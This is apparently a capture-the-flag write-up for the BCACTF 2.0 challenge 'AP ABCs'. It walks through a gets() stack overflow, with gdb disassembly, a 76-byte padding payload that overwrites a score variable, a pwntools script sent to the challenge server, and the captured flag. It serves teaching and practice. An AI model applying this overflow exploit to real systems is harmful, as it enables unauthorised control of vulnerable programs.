# AP ABCs

#### Category : binex
#### Points : 100 points (195 solves)
#### Author : Edward Feng

## Challenge
Oh wow, they put a freshman in AP ABCs? Never thought I'd see this happen. Anyways, good luck, and make sure to not cheat on your AP test!

-   [ap-abcs.c](https://objects.bcactf.com/bcactf2/ap-abcs/ap-abcs.c)
-   [ap-abcs](https://objects.bcactf.com/bcactf2/ap-abcs/ap-abcs)
-   `nc bin.bcactf.com 49154`

## Solution
Reading the souce code, it is clear that we need to overflow the value of `score` to `0x73434241` using the `gets(response);` call.

Debugging the binary with gdb, we find the instructions where comparisons take place
```bash
   0x0000555555555583 <+762>:	cmp    DWORD PTR [rbp-0x8],0x0
   0x0000555555555587 <+766>:	jne    0x555555555590 <main+775>
   0x0000555555555589 <+768>:	mov    DWORD PTR [rbp-0x4],0x1
   0x0000555555555590 <+775>:	cmp    DWORD PTR [rbp-0x8],0x7
   0x0000555555555594 <+779>:	je     0x5555555555a8 <main+799>
   0x0000555555555596 <+781>:	cmp    DWORD PTR [rbp-0x8],0xe
   0x000055555555559a <+785>:	je     0x5555555555a8 <main+799>
   0x000055555555559c <+787>:	cmp    DWORD PTR [rbp-0x8],0x14
   0x00005555555555a0 <+791>:	je     0x5555555555a8 <main+799>
   0x00005555555555a2 <+793>:	cmp    DWORD PTR [rbp-0x8],0x18
   0x00005555555555a6 <+797>:	jne    0x5555555555ac <main+803>
   0x00005555555555a8 <+799>:	add    DWORD PTR [rbp-0x4],0x1
   0x00005555555555ac <+803>:	add    DWORD PTR [rbp-0x8],0x1
 ```
 
 `rbp-0x8` is the counter variable `i` and `rbp-0x8` is the variable `score`
 We need to overflow the value of `rbp-0x4` to `0x73434241`.
 Setting a breakpoint and trying out different length of payloads, we find the following is able to overwrite `rbp-0x4` to our required value.
 
 ```bash
 run < <(python -c "print('A'*76+'\x41\x42\x43\x73')")
 ```
 ```bash
 gef➤  x/x $rbp-0x4
0x7fffffffe72c:	0x73434241
```

#### Getting flag
We can make our [get_flag.py](https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BCACTF%202.0/AP%20ABCs/get_flag.py) script as :
```python
#!/usr/bin/python2
from pwn import *
host = "bin.bcactf.com"
port = 49154
payload = "A"*76 + "\x41\x42\x43\x73"
s = remote(host, port)
s.recvuntil("Answer for 1:")
s.sendline(payload)
print(s.recvuntil("bcactf{")[-7:] + s.recvuntil("}"))
```
```bash
[+] Opening connection to bin.bcactf.com on port 49154: Done
bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}
[*] Closed connection to bin.bcactf.com port 49154
```

flag : `bcactf{bca_is_taking_APs_in_june_aaaaaaaa_wish_past_me_luck}`